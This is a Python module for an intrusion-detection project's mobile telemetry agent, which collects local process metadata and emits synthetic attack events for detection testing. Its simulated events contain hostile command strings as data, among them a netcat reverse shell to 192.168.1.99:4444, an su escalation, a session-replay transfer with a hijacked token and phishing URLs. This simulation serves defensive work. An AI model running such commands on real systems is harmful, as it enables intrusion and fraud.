"""Mobile / Endpoint Security Telemetry Agent.

Provides safe, non-destructive mobile telemetry collection and deterministic
simulation of mobile endpoint attack scenarios for the Intelligent Cloud IDS.
"""

import argparse
from datetime import datetime, timezone
import getpass
import logging
import os
import socket
import sys
from typing import Any, Dict, Optional, Tuple, Union
import uuid

from agents.agent_client import AgentClient, AgentResponse
from backend.schemas.api_security_event import (
    ApiSecurityEvent,
    EndpointInfo,
    IdentityInfo,
    NetworkInfo,
    RequestInfo,
    ResourceInfo,
    ResponseInfo,
)

logger = logging.getLogger("agents.mobile_agent")


class MobileAgent:
    """Standalone Mobile / Endpoint Agent for telemetry collection and simulation."""

    def __init__(
        self,
        client: Optional[AgentClient] = None,
        device_id: Optional[str] = None,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> None:
        self.client: AgentClient = client or AgentClient()
        self.device_id: str = device_id or "ANDROID-DEV-01"
        self.hostname: str = hostname or self._get_safe_hostname()
        self.username: str = username or self._get_safe_username()

    @staticmethod
    def _get_safe_hostname() -> str:
        """Safely retrieve local machine / device hostname using standard library."""
        try:
            name = socket.gethostname()
            if name:
                return name
        except Exception as exc:
            logger.debug("Failed to obtain device hostname via socket: %s", exc)
        return "UNKNOWN-MOBILE-DEVICE"

    @staticmethod
    def _get_safe_username() -> str:
        """Safely retrieve current user without invoking shell."""
        try:
            user = getpass.getuser()
            if user:
                return user
        except Exception as exc:
            logger.debug("Failed to obtain user via getpass: %s", exc)

        for env_var in ("USERNAME", "USER", "LOGNAME"):
            val = os.getenv(env_var)
            if val:
                return val
        return "mobile_user"

    @staticmethod
    def _get_safe_privileges() -> Tuple[str, bool]:
        """Safely check process elevation without system modification."""
        try:
            if sys.platform == "win32":
                import ctypes

                is_admin = bool(ctypes.windll.shell32.IsUserAnAdmin())
                return ("ADMIN" if is_admin else "USER", is_admin)
            else:
                is_root = os.geteuid() == 0
                return ("ROOT" if is_root else "USER", is_root)
        except Exception as exc:
            logger.debug("Elevation check failed: %s", exc)
            return ("USER", False)

    # =========================================================================
    # 1. SAFE LIVE TELEMETRY MODE
    # =========================================================================

    def collect_telemetry(self) -> EndpointInfo:
        """
        Collect safe, non-destructive local metadata from the current process / device.

        Does NOT install hooks, access credentials, execute shell commands,
        modify files, open network connections, or perform real attacks.
        """
        privilege_level, is_elevated = self._get_safe_privileges()

        process_id: Optional[int] = None
        try:
            process_id = os.getpid()
        except Exception:
            pass

        parent_pid: Optional[int] = None
        try:
            if hasattr(os, "getppid"):
                parent_pid = os.getppid()
        except Exception:
            pass

        executable_path: Optional[str] = None
        try:
            executable_path = sys.executable
        except Exception:
            pass

        process_name: Optional[str] = None
        if executable_path:
            process_name = os.path.basename(executable_path)

        command_line: Optional[str] = None
        try:
            command_line = " ".join(sys.argv)
        except Exception:
            pass

        return EndpointInfo(
            event_type="mobile_heartbeat",
            hostname=self.hostname,
            username=self.username,
            process_name=process_name or "python.exe",
            process_id=process_id,
            parent_process=f"pid_{parent_pid}" if parent_pid else None,
            executable_path=executable_path,
            command_line=command_line,
            privilege_level=privilege_level,
            keyboard_hook=False,
            network_connection=False,
            elevated=is_elevated,
        )

    # =========================================================================
    # 2. SCENARIO SIMULATION MODE (TELEMETRY ONLY - NO REAL ATTACKS)
    # =========================================================================

    def simulate_suspicious_app(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Generate synthetic telemetry for suspicious mobile app execution.
        No real app is installed or executed.
        """
        return EndpointInfo(
            event_type="process_creation",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="com.malicious.banker",
            process_id=5120,
            parent_process="zygote",
            executable_path="/data/app/com.malicious.banker/base.apk",
            command_line="com.malicious.banker -enc downloadstring bypass hidden",
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=False,
            elevated=False,
        )

    def simulate_keylogging(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Generate synthetic telemetry representing mobile accessibility abuse / keylogging.
        No hook or accessibility service is installed or active.
        """
        return EndpointInfo(
            event_type="keylogger_detected",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="com.accessibility.monitor",
            process_id=5180,
            parent_process="system_server",
            executable_path="/data/app/com.accessibility.monitor/base.apk",
            command_line="com.accessibility.monitor --capture-keys",
            privilege_level="USER",
            keyboard_hook=True,
            network_connection=False,
            elevated=False,
        )

    def simulate_accessibility_abuse(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """Alias for simulate_keylogging in mobile context."""
        return self.simulate_keylogging(hostname=hostname, username=username)

    def simulate_reverse_shell(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Generate synthetic telemetry representing reverse shell activity from mobile.
        No shell or network connection is created.
        """
        return EndpointInfo(
            event_type="reverse_shell",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="sh",
            process_id=5250,
            parent_process="com.malicious.app",
            executable_path="/system/bin/sh",
            command_line="sh -i nc -e sh 192.168.1.99 4444",
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=True,
            elevated=False,
        )

    def simulate_privilege_escalation(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Generate synthetic telemetry representing mobile rooting / privilege escalation.
        No root commands or exploit execution takes place.
        """
        return EndpointInfo(
            event_type="privilege_escalation",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="su",
            process_id=5320,
            parent_process="com.root.helper",
            executable_path="/system/xbin/su",
            command_line="su -c whoami /priv",
            privilege_level="ROOT",
            keyboard_hook=False,
            network_connection=False,
            elevated=True,
        )

    # Alias for API compatibility with LaptopAgent
    simulate_suspicious_process = simulate_suspicious_app

    def simulate_unauthorized_transaction(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Scenario 6: Generate synthetic telemetry for unauthorized mobile session / transaction abuse.
        Simulates an unauthorized app attempting background session replay against payments.
        No real transactions or funds transfers are performed.
        """
        return EndpointInfo(
            event_type="unauthorized_transaction",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="com.session.replay.bot",
            process_id=5410,
            parent_process="zygote",
            executable_path="/data/app/com.session.replay.bot/base.apk",
            command_line="com.session.replay.bot --replay-session token-9988 --target /api/transactions/transfer",
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=True,
            elevated=False,
        )

    # Alias for Scenario 6
    simulate_transaction_abuse = simulate_unauthorized_transaction

    def simulate_fake_shopping(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Scenario 7: Generate synthetic telemetry representing mobile fake shopping app / fraudulent store.
        Simulates in-app webview loading a suspicious shopping storefront.
        Does not visit or resolve any real fraudulent website.
        """
        return EndpointInfo(
            event_type="fake_shopping",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="com.fake.shopping.app",
            process_id=5520,
            parent_process="zygote",
            executable_path="/data/app/com.fake.shopping.app/base.apk",
            command_line="com.fake.shopping.app --open-url http://fake-shopping-deals-mall.xyz/deals",
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=True,
            elevated=False,
        )

    # Alias for Scenario 7
    simulate_fraudulent_website = simulate_fake_shopping

    def simulate_fake_bank(
        self,
        hostname: Optional[str] = None,
        username: Optional[str] = None,
    ) -> EndpointInfo:
        """
        Scenario 8: Generate synthetic telemetry representing fake bank / suspicious URL on mobile.
        Simulates opening a deceptive banking phishing link received via SMS/smishing.
        Does not resolve any real domain or collect credentials.
        """
        return EndpointInfo(
            event_type="fake_bank",
            hostname=hostname or self.hostname,
            username=username or self.username,
            process_name="com.android.chrome",
            process_id=5630,
            parent_process="com.google.android.apps.messaging",
            executable_path="/data/app/com.android.chrome/base.apk",
            command_line="com.android.chrome --url http://secure-login-verify-bank-account.info/login",
            privilege_level="USER",
            keyboard_hook=False,
            network_connection=True,
            elevated=False,
        )

    # Alias for Scenario 8
    simulate_suspicious_url = simulate_fake_bank

    # =========================================================================
    # 3. ApiSecurityEvent CREATION (USING EXISTING BACKEND SCHEMA)
    # =========================================================================

    def build_event(
        self,
        endpoint_info: EndpointInfo,
        event_id: Optional[str] = None,
        timestamp: Optional[datetime] = None,
        network_info: Optional[NetworkInfo] = None,
        identity_info: Optional[IdentityInfo] = None,
        request_info: Optional[RequestInfo] = None,
        response_info: Optional[ResponseInfo] = None,
        resource_info: Optional[ResourceInfo] = None,
    ) -> ApiSecurityEvent:
        """
        Construct a fully valid ApiSecurityEvent tagged with domain="ENDPOINT".
        Uses existing schema without duplication and contextually populates
        telemetry for demo scenarios if not explicitly overridden.
        """
        evt_id = event_id or f"mobile-evt-{uuid.uuid4().hex[:8]}"
        evt_time = timestamp or datetime.now(timezone.utc)
        evt_type = endpoint_info.event_type or ""

        net_info = network_info or NetworkInfo(
            source_ip="192.168.1.150",
            user_agent="MobileAgent/1.0 (Android 14; Mobile)",
        )

        if identity_info is not None:
            id_info = identity_info
        elif evt_type in ("unauthorized_transaction", "transaction_abuse"):
            id_info = IdentityInfo(
                user_id="compromised_mobile_user",
                session_id="stolen-mobile-session-9988",
                roles=["customer"],
                is_authenticated=True,
            )
        elif evt_type in ("fake_shopping", "fraudulent_website"):
            id_info = IdentityInfo(
                user_id="mobile_shopper_45",
                session_id="fake-shop-mobile-sess-771",
                roles=["customer"],
                is_authenticated=False,
            )
        elif evt_type in ("fake_bank", "suspicious_url"):
            id_info = IdentityInfo(
                user_id="targeted_mobile_banking_user",
                session_id="fake-bank-mobile-sess-990",
                roles=["banking_user"],
                is_authenticated=False,
            )
        else:
            id_info = IdentityInfo(
                user_id=self.username,
                roles=["mobile_app_user"],
                is_authenticated=True,
            )

        if request_info is not None:
            req_info = request_info
        elif evt_type in ("unauthorized_transaction", "transaction_abuse"):
            req_info = RequestInfo(
                method="POST",
                endpoint="/api/transactions/transfer",
                headers={"X-Session-State": "replayed", "Authorization": "Bearer mobile-hijacked-token"},
                body={"recipient_account": "ACC-UNKNOWN-999", "amount": 9500.0, "currency": "USD", "action": "unauthorized_transfer"},
            )
        elif evt_type in ("fake_shopping", "fraudulent_website"):
            req_info = RequestInfo(
                method="POST",
                endpoint="/api/shopping/checkout",
                headers={"Host": "fake-shopping-deals-mall.xyz"},
                query_params={"url": "http://fake-shopping-deals-mall.xyz/deals", "category": "fraudulent_store"},
                body={"merchant": "SuperDiscountMall-Fraudulent", "cart_total": 12.99, "suspected_phishing": True},
            )
        elif evt_type in ("fake_bank", "suspicious_url"):
            req_info = RequestInfo(
                method="GET",
                endpoint="/api/banking/login",
                headers={"Host": "secure-login-verify-bank-account.info"},
                query_params={"url": "http://secure-login-verify-bank-account.info/login", "suspicious_domain": "secure-login-verify-bank-account.info"},
                body={"phishing_domain": "secure-login-verify-bank-account.info", "fake_brand": "FirstNationalDemoBank"},
            )
        else:
            req_info = RequestInfo(
                method="POST",
                endpoint="/mobile/telemetry",
            )

        resp_info = response_info or ResponseInfo(
            status_code=200,
        )

        if resource_info is not None:
            res_info = resource_info
        elif evt_type in ("unauthorized_transaction", "transaction_abuse"):
            res_info = ResourceInfo(
                resource_type="transaction",
                resource_id="tx-unauth-mobile-8821",
                owner_id="victim_account_12",
                is_sensitive=True,
            )
        elif evt_type in ("fake_shopping", "fraudulent_website"):
            res_info = ResourceInfo(
                resource_type="shopping_session",
                resource_id="fake-mall-mobile-332",
                owner_id="mobile_shopper_45",
                is_sensitive=True,
            )
        elif evt_type in ("fake_bank", "suspicious_url"):
            res_info = ResourceInfo(
                resource_type="bank_account",
                resource_id="fake-bank-mobile-portal",
                owner_id="targeted_mobile_banking_user",
                is_sensitive=True,
            )
        else:
            res_info = ResourceInfo(
                resource_type="mobile_device",
                resource_id=self.device_id or self.hostname,
            )

        return ApiSecurityEvent(
            schema_version="1.0",
            event_id=evt_id,
            timestamp=evt_time,
            domain="ENDPOINT",
            network=net_info,
            identity=id_info,
            request=req_info,
            response=resp_info,
            resource=res_info,
            endpoint=endpoint_info,
        )

    # =========================================================================
    # 4. SEND TO BACKEND
    # =========================================================================

    def send_event(self, event: ApiSecurityEvent) -> AgentResponse:
        """Delegate event transmission to the configured AgentClient."""
        return self.client.send_event(event)


# =============================================================================
# 5. CLI INTERFACE
# =============================================================================

def parse_args(args: Optional[list[str]] = None) -> argparse.Namespace:
    """Parse and validate command line arguments for MobileAgent."""
    parser = argparse.ArgumentParser(
        prog="python -m agents.mobile_agent",
        description="Mobile / Endpoint Security Telemetry Agent (Safe & Simulated)",
    )
    parser.add_argument(
        "--mode",
        choices=["live", "simulate"],
        default="live",
        help="Operating mode: 'live' (collect safe local metadata) or 'simulate' (synthetic scenario).",
    )
    parser.add_argument(
        "--scenario",
        choices=[
            "suspicious_app",
            "keylogging",
            "accessibility_abuse",
            "reverse_shell",
            "privilege_escalation",
            "unauthorized_transaction",
            "transaction_abuse",
            "fake_shopping",
            "fraudulent_website",
            "fake_bank",
            "suspicious_url",
        ],
        default=None,
        help="Attack scenario to simulate (required if --mode is 'simulate').",
    )
    parser.add_argument(
        "--send",
        action="store_true",
        help="Explicitly transmit the generated event to the backend /events endpoint.",
    )
    parser.add_argument(
        "--url",
        default=None,
        help="Custom backend endpoint URL (e.g. http://localhost:8000/events).",
    )
    parser.add_argument(
        "--device-id",
        default=None,
        help="Custom mobile device identifier (e.g. PIXEL-8-PRO).",
    )

    parsed = parser.parse_args(args)
    if parsed.mode == "simulate" and not parsed.scenario:
        parser.error("--scenario is required when --mode is 'simulate'")

    return parsed


def main(cli_args: Optional[list[str]] = None) -> int:
    """CLI entrypoint for MobileAgent."""
    args = parse_args(cli_args)
    client = AgentClient(endpoint_url=args.url)
    agent = MobileAgent(client=client, device_id=args.device_id)

    if args.mode == "live":
        telemetry = agent.collect_telemetry()
        event = agent.build_event(telemetry)
        print("=== SAFE MOBILE LIVE TELEMETRY COLLECTED ===")
        print(f"Event ID:      {event.event_id}")
        print(f"Timestamp:     {event.timestamp.isoformat()}")
        print(f"Domain:        {event.domain}")
        print(f"Device ID:     {agent.device_id}")
        print(f"Hostname:      {telemetry.hostname}")
        print(f"Username:      {telemetry.username}")
        print(f"Process Name:  {telemetry.process_name} (PID: {telemetry.process_id})")
        print(f"Privilege:     {telemetry.privilege_level} (Elevated: {telemetry.elevated})")
        print(f"Command Line:  {telemetry.command_line}")
    elif args.mode == "simulate":
        scenario_map = {
            "suspicious_app": agent.simulate_suspicious_app,
            "keylogging": agent.simulate_keylogging,
            "accessibility_abuse": agent.simulate_keylogging,
            "reverse_shell": agent.simulate_reverse_shell,
            "privilege_escalation": agent.simulate_privilege_escalation,
            "unauthorized_transaction": agent.simulate_unauthorized_transaction,
            "transaction_abuse": agent.simulate_unauthorized_transaction,
            "fake_shopping": agent.simulate_fake_shopping,
            "fraudulent_website": agent.simulate_fake_shopping,
            "fake_bank": agent.simulate_fake_bank,
            "suspicious_url": agent.simulate_fake_bank,
        }
        simulator_fn = scenario_map[args.scenario]
        telemetry = simulator_fn()
        event = agent.build_event(telemetry)

        print(f"=== SIMULATED MOBILE SCENARIO: {args.scenario} ===")
        print(f"Event ID:      {event.event_id}")
        print(f"Timestamp:     {event.timestamp.isoformat()}")
        print(f"Domain:        {event.domain}")
        print(f"Device ID:     {agent.device_id}")
        print(f"Event Type:    {telemetry.event_type}")
        print(f"Process Name:  {telemetry.process_name}")
        print(f"Command Line:  {telemetry.command_line}")
        print(f"Keyboard Hook: {telemetry.keyboard_hook}")
        print(f"Net Connect:   {telemetry.network_connection}")
        print(f"Privilege:     {telemetry.privilege_level} (Elevated: {telemetry.elevated})")
    else:
        print(f"Error: Unknown mode '{args.mode}'", file=sys.stderr)
        return 1

    if args.send:
        print("\nSending event to backend...")
        resp = agent.send_event(event)
        if resp.success:
            print(f"[SUCCESS] Backend responded HTTP {resp.status_code}")
            print(f"Status:            {resp.get('status')}")
            print(f"Mitigation Action: {resp.get('mitigation_action')}")
            risk = resp.get("risk_assessment")
            if isinstance(risk, dict):
                print(f"Risk Score:        {risk.get('score')} ({risk.get('severity')})")
            impact = resp.get("impact_assessment")
            if isinstance(impact, dict):
                print(f"Impact:            {impact.get('summary')}")
            return 0
        else:
            print(f"[FAILURE] HTTP {resp.status_code or 'N/A'}: {resp.error}")
            return 2
    else:
        print("\n[NOTE] Event was NOT sent to backend (pass --send to transmit).")
        return 0


if __name__ == "__main__":
    sys.exit(main())
